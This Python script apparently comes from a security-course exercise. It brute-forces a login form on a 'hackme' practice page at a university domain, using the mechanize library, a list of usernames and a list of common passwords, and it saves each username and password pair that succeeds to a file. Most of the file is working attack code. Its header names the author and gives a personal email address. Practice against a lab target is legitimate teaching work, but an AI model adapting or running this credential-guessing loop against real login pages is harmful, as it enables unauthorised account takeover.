# Name: Kunal Mukherjee
# Personal email: kunmukh@GMAIL.COM
# Date: 4/25/21
# File name: 
# Project name:
hackme_url="http://fiona.utdallas.edu/hackme/"
username_file="users.txt"
password_file= "password.txt"
common_file="common-pass2.txt"
import mechanize


def merge(username_lst, pass_lst):
    pass_f = open("pass.txt", "w")

    k = 0
    for i, user in enumerate(username_lst):
        if pass_lst[i] not in "Incorrect":
            br = mechanize.Browser()
            br.open(hackme_url)

            # use to select the first form in the page if it is unnamed
            br.select_form(nr=0)

            br.form['username'] = user
            br.form['password'] = pass_lst[i]

            br.method = "POST"
            response = br.submit()

            body = response.read().decode("utf-8")

            if "Incorrect password" not in body:
                print(f"{k}:{user}:{pass_lst[i]}:Success")
                print(f"{user}\t{pass_lst[i]}\n")
                pass_f.write(f"{user}\t{pass_lst[i]}\n")
                k += 1
        else:
            pass_f.write(f"{user}\t\n")
    pass_f.close()


def main():

    username_lst = []
    pass_lst = []
    common_pass_lst = []

    common_f = open(common_file, "r")
    for x in common_f:
        common_pass_lst.append(x.replace("\n", ""))
    common_f.close()

    username_f = open(username_file, "r")
    for x in username_f:
        username_lst.append(x.replace("\n",""))
    username_f.close()
    print(f"username list: {username_lst}")

    pass_f = open(password_file, "r")
    for x in pass_f:
        pass_lst.append(x.replace("\n", ""))
    pass_f.close()
    print(f"pass list: {pass_lst}")

    merge(username_lst, pass_lst)
    exit()

    '''k = 0
    for i, user in enumerate(username_lst):
        if pass_lst[i] not in "Incorrect":
            br = mechanize.Browser()
            br.open(hackme_url)

            # use to select the first form in the page if it is unnamed
            br.select_form(nr=0)

            br.form['username'] = user
            br.form['password'] = pass_lst[i]

            br.method = "POST"
            response = br.submit()

            body = response.read().decode("utf-8")

            if "Incorrect password" not in body:
                print(f"{k}:{user}:{pass_lst[i]}:Success")
                k +=1
    exit()'''

    found = 0
    for passw in pass_lst:
        if passw not in "Incorrect":
            found += 1

            if passw in common_pass_lst:
                common_pass_lst.remove(passw)

    for j, common_pass in enumerate(common_pass_lst):
        for i, user in enumerate(username_lst):
            if pass_lst[i] in "Incorrect":
                br = mechanize.Browser()
                br.open(hackme_url)

                # use to select the first form in the page if it is unnamed
                br.select_form(nr=0)

                br.form['username'] = user
                br.form['password'] = common_pass

                br.method = "POST"
                response = br.submit()

                body = response.read().decode("utf-8")

                if "Incorrect password" not in body:
                    print(f"{user}:{common_pass}:Success")
                    pass_lst[i] = common_pass

                    pass_f = open(password_file, "w")
                    for p in pass_lst:
                        pass_f.write(f"{p}\n")
                    pass_f.close()

                    found += 1

                    break
                else:
                    print(f"{found}/100 {i}/{len(username_lst)} {j}/"
                          f"{len(common_pass_lst)} {user}:failure")
                    pass_lst[i] = "Incorrect"


if __name__ == '__main__':
    main()